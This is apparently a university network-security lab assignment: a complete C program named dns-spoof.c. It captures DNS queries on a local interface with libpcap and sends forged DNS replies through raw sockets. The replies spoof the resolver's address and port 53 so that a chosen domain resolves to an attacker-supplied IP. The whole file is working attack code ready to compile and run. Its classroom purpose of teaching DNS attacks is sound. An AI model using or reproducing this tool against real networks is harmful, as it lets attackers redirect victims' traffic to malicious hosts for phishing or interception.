/**
 * MO639 - Segurança de Redes
 * lab03 - DNS spoof
 * dns-spoof.c
 *
 * Gabriel Lorencetti Prado - 060999
 * Mauro Tardivo Filho      - 063140
 * Rodrigo Shizuo Yasuda    - 074358
 * 
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <resolv.h>

#define IP_SIZE 16
#define REQUEST_SIZE 100
#define PCAP_INTERFACENAME_SIZE 16
#define FILTER_SIZE 200
#define ETHER_ADDR_LEN  6
#define DATAGRAM_SIZE 8192

typedef struct _SpoofParams_ {
  char ip[IP_SIZE];                        /* ip address (xxx.xxx.xxx.xxx) */
  char request[REQUEST_SIZE];              /* request address (www.example.com) */
  char interface[PCAP_INTERFACENAME_SIZE]; /* interface name */
} SpoofParams;

/* ethernet header definition */
struct etherhdr{
  u_char ether_dhost[ETHER_ADDR_LEN]; /* dst address */
  u_char ether_shost[ETHER_ADDR_LEN]; /* src address */
  u_short ether_type; /* network protocol */
};

/* DNS header definition */
struct dnshdr {
  char id[2];
  char flags[2];
  char qdcount[2];
  char ancount[2];
  char nscount[2];
  char arcount[2];
};

/* DNS query structure */
struct dnsquery {
  char *qname;
  char qtype[2];
  char qclass[2];
};

/* DNS answer structure */
struct dnsanswer {
  char *name;
  char atype[2];
  char aclass[2];
  char ttl[4];
  char RdataLen[2];
  char *Rdata;
};

/**
 * Prints a terminal message with host IP and request
 */
void print_message(char* request, char* ip){
  printf("O host %s fez uma requisição a %s\n", ip, request);
}

/**
 * Sends a dns answer using raw sockets
 */
void send_dns_answer(char* ip, u_int16_t port, char* packet, int packlen) {
  struct sockaddr_in to_addr;
  int bytes_sent;
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  int one = 1;
  const int *val = &one;

  if (sock < 0) {
    fprintf(stderr, "Error creating socket");
    return;
  }
  to_addr.sin_family = AF_INET;
  to_addr.sin_port = htons(port);
  to_addr.sin_addr.s_addr = inet_addr(ip);
  
  if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0){
    fprintf(stderr, "Error at setsockopt()");
    return;
  }
  
  bytes_sent = sendto(sock, packet, packlen, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
  if(bytes_sent < 0)
    fprintf(stderr, "Error sending data");
}

/**
 * Calculates a checksum for a given header
 */
unsigned short csum(unsigned short *buf, int nwords){
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return ~sum;
}

/**
 * Builds an UDP/IP datagram
 */
void build_udp_ip_datagram(char* datagram, unsigned int payload_size, char* src_ip, char* dst_ip, u_int16_t port){
  
  struct ip *ip_hdr = (struct ip *) datagram;
  struct udphdr *udp_hdr = (struct udphdr *) (datagram + sizeof (struct ip));
  
  ip_hdr->ip_hl = 5; //header length
  ip_hdr->ip_v = 4; //version
  ip_hdr->ip_tos = 0; //tos
  ip_hdr->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + payload_size;  //length
  ip_hdr->ip_id = 0; //id
  ip_hdr->ip_off = 0; //fragment offset
  ip_hdr->ip_ttl = 255; //ttl
  ip_hdr->ip_p = 17; //protocol
  ip_hdr->ip_sum = 0; //temp checksum
  ip_hdr->ip_src.s_addr = inet_addr (dst_ip); //src ip - spoofed
  ip_hdr->ip_dst.s_addr = inet_addr(src_ip); //dst ip
  
  udp_hdr->source = htons(53); //src port - spoofed
  udp_hdr->dest = htons(port); //dst port
  udp_hdr->len = htons(sizeof(struct udphdr) + payload_size); //length
  udp_hdr->check = 0; //checksum - disabled
  
  ip_hdr->ip_sum = csum((unsigned short *) datagram, ip_hdr->ip_len >> 1); //real checksum
  
}

/**
 * Builds a DNS answer
 */
unsigned int build_dns_answer(SpoofParams *spoof_params, struct dnshdr *dns_hdr, char* answer, char* request){
  
  unsigned int size = 0; /* answer size */
  struct dnsquery *dns_query;
  unsigned char ans[4];
  
  sscanf(spoof_params->ip, "%d.%d.%d.%d",(int *)&ans[0],(int *)&ans[1], (int *)&ans[2], (int *)&ans[3]);
  
  dns_query = (struct dnsquery*)(((char*) dns_hdr) + sizeof(struct dnshdr));
  
  //dns_hdr
  memcpy(&answer[0], dns_hdr->id, 2); //id
  memcpy(&answer[2], "\x81\x80", 2); //flags
  memcpy(&answer[4], "\x00\x01", 2); //qdcount
  memcpy(&answer[6], "\x00\x01", 2); //ancount
  memcpy(&answer[8], "\x00\x00", 2); //nscount
  memcpy(&answer[10], "\x00\x00", 2); //arcount

  //dns_query
  size = strlen(request)+2;// +1 for the size of the first string; +1 for the last '.'
  memcpy(&answer[12], dns_query, size); //qname
  size+=12;
  memcpy(&answer[size], "\x00\x01", 2); //type
  size+=2;
  memcpy(&answer[size], "\x00\x01", 2); //class
  size+=2;

  //dns_answer
  memcpy(&answer[size], "\xc0\x0c", 2); //pointer to qname
  size+=2;
  memcpy(&answer[size], "\x00\x01", 2); //type
  size+=2;
  memcpy(&answer[size], "\x00\x01", 2); //class
  size+=2;
  memcpy(&answer[size], "\x00\x00\x00\x22", 4); //ttl - 34s
  size+=4;
  memcpy(&answer[size], "\x00\x04", 2); //rdata length
  size+=2;
  memcpy(&answer[size], ans, 4); //rdata
  size+=4;
  
  return size;
  
}

/**
 * Extracts the request from a dns query
 * It comes in this format: [3]www[7]example[3]com[0]
 * And it is returned in this: www.example.com
 */
void extract_dns_request(struct dnsquery *dns_query, char *request){
  unsigned int i, j, k;
  char *curr = dns_query->qname;
  unsigned int size;
  
  size = curr[0];

  j=0;
  i=1;
  while(size > 0){
    for(k=0; k<size; k++){
      request[j++] = curr[i+k];
    }
    request[j++]='.';
    i+=size;
    size = curr[i++];
  }
  request[--j] = '\0';
}

/**
 * Extracts the src port from a udp header
 */
void extract_port_from_udphdr(struct udphdr* udp, u_int16_t* port){
  (*port) = ntohs((*(u_int16_t*)udp));
}

/**
 * Extracts an ip from a ip header
 */
void extract_ip_from_iphdr(u_int32_t raw_ip, char* ip){
  int i;
  int aux[4];
  
  for(i=0;i<4;i++){
    aux[i] = (raw_ip >> (i*8)) & 0xff;
  }
  
  sprintf(ip, "%d.%d.%d.%d",aux[0], aux[1], aux[2], aux[3]);
}

/**
 * Extracts DNS query and ip from packet
 */
void extract_dns_data(const u_char *packet, struct dnshdr **dns_hdr, struct dnsquery *dns_query, char* src_ip, char* dst_ip, u_int16_t *port){
  struct etherhdr *ether;
  struct iphdr *ip;
  struct udphdr *udp;
  unsigned int ip_header_size;
  
  /* ethernet header */
  ether = (struct etherhdr*)(packet);

  /* ip header */
  ip = (struct iphdr*)(((char*) ether) + sizeof(struct etherhdr));
  extract_ip_from_iphdr(ip->saddr, src_ip);
  extract_ip_from_iphdr(ip->daddr, dst_ip);
  
  /* udp header */
  ip_header_size = ip->ihl*4;
  udp = (struct udphdr *)(((char*) ip) + ip_header_size);
  extract_port_from_udphdr(udp, port);

  /* dns header */
  *dns_hdr = (struct dnshdr*)(((char*) udp) + sizeof(struct udphdr));

  dns_query->qname = ((char*) *dns_hdr) + sizeof(struct dnshdr);
  
}

/**
 * Callback function to handle packets
 */
void handle_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
  SpoofParams *spoof_params;
  struct dnsquery dns_query;
  struct dnshdr *dns_hdr;

  char request[REQUEST_SIZE];
  char src_ip[IP_SIZE], dst_ip[IP_SIZE];
  u_int16_t port;

  char datagram[DATAGRAM_SIZE];
  char* answer;
  unsigned int datagram_size; 
  
  memset(datagram, 0, DATAGRAM_SIZE);
  spoof_params = (SpoofParams*)args;
  extract_dns_data(packet, &dns_hdr, &dns_query, src_ip, dst_ip, &port);
  extract_dns_request(&dns_query, request);
  
  /* if it is the request that we are looking for */
  if(!strcmp(request, spoof_params->request)){

    /* answer is pointed to the beginning of dns header */
    answer = datagram + sizeof(struct ip) + sizeof(struct udphdr);

    /* modifies answer to attend our dns spoof and returns its size */
    datagram_size = build_dns_answer(spoof_params, dns_hdr, answer, request);
    
    /* modifies udp/ip to attend our dns spoof */
    build_udp_ip_datagram(datagram, datagram_size, src_ip, dst_ip, port);
    
    /* update the datagram size with ip and udp header */
    datagram_size += (sizeof(struct ip) + sizeof(struct udphdr));
    
    /* sends our dns spoof msg */
    send_dns_answer(src_ip, port, datagram, datagram_size);
    print_message(request, src_ip);
  }
}

/**
 * Runs the filter
 */
void run_filter(SpoofParams *spoof_params){

  char filter[FILTER_SIZE];      /* filter expression */
  char errbuf[PCAP_ERRBUF_SIZE]; /* pcap error messages buffer */
  struct bpf_program fp;         /* compiled filter */
  pcap_t *handle;

  
  memset(errbuf, 0, PCAP_ERRBUF_SIZE);
  handle = pcap_open_live(spoof_params->interface, /* device to sniff on */
                          1500,                    /* maximum number of bytes to capture per packet */
                          1,                       /* promisc - 1 to set card in promiscuous mode, 0 to not */
                          0,                       /* to_ms - amount of time to perform packet capture in milliseconds */
                                                   /* 0 = sniff until error */
                          errbuf);                 /* error message buffer if something goes wrong */

  if (handle == NULL)   /* there was an error */
  {
    fprintf (stderr, "%s", errbuf);
    exit (1);
  }

  if (strlen(errbuf) > 0)
  {
    fprintf (stderr, "Warning: %s", errbuf);  /* a warning was generated */
    errbuf[0] = 0;    /* reset error buffer */
  }
  
  /* only DNS queries */
  sprintf(filter, "udp and dst port domain");
  
  /* compiles the filter expression */
  if(pcap_compile(handle, &fp, filter, 0, 0) == -1){
    fprintf(stderr, "Couldn't parse filter %s: %s\n", filter, pcap_geterr(handle));
    exit(-1);
  }
  
  /* applies the filter */
  if (pcap_setfilter(handle, &fp) == -1) {
    fprintf(stderr, "Couldn't install filter %s: %s\n", filter, pcap_geterr(handle));
    exit(-1);
  }
  
  /* loops through the packets */
  pcap_loop(handle, -1, handle_packet, (u_char*)spoof_params);
  
  /* frees the compiled filter */
  pcap_freecode(&fp);
  
  /* closes the handler */
  pcap_close(handle);
}

/**
 * Program usage
 */
void usage(char *prog_name){
  fprintf(stderr, "Usage:%s --interface <interface> --request <request> --ip <ip>\n", prog_name);
  exit(-1);
}

/**
 * Parse arguments
 */
void parse_args(int argc, char *argv[], SpoofParams *spoof_params){
  
  unsigned int i; /* iterator */
  
  /* invalid parameters count */
  if(argc != 7){
    fprintf(stderr, "Too few parameters found.\n");
    usage(argv[0]);
  }
  
  for(i = 1; i < argc ; i++){
    if(!strcmp(argv[i], "--interface")){
      strncpy(spoof_params->interface, argv[++i], PCAP_INTERFACENAME_SIZE-1);
      spoof_params->interface[PCAP_INTERFACENAME_SIZE-1] = '\0';
    }
    
    if(!strcmp(argv[i], "--request")){
      strncpy(spoof_params->request, argv[++i], REQUEST_SIZE-1);
      spoof_params->request[REQUEST_SIZE-1] = '\0';
    }
    
    if(!strcmp(argv[i], "--ip")){
      strncpy(spoof_params->ip, argv[++i], IP_SIZE-1);
      spoof_params->ip[IP_SIZE-1] = '\0';
    }
  }
}

/**
 * This is the main function
 * Gets the args and runs the filter
 */
int main(int argc, char **argv){
  SpoofParams spoof_params; /* arguments */
  
  parse_args(argc, argv, &spoof_params);
  
  run_filter(&spoof_params);
  
  return 0;
}
